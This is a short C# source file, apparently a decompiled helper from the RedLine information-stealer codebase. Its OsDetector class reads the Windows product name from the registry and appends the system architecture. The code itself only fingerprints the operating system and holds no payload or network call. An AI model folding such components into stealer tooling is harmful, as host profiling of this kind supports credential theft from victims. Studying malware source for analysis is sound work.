using Microsoft.Win32;
using System;

namespace RedLine.Logic.Helpers
{
  public static class OsDetector
  {
    private static string HKLM_GetString(string key, string value)
    {
      try
      {
        return Registry.LocalMachine.OpenSubKey(key)?.GetValue(value).ToString() ?? string.Empty;
      }
      catch
      {
        return string.Empty;
      }
    }

    public static string GetWindowsVersion()
    {
      string str1;
      try
      {
        str1 = Environment.Is64BitOperatingSystem ? "x64" : "x32";
      }
      catch (Exception ex)
      {
        str1 = "x86";
      }
      string str2 = OsDetector.HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
      OsDetector.HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
      if (!string.IsNullOrEmpty(str2))
        return str2 + " " + str1;
      return string.Empty;
    }
  }
}
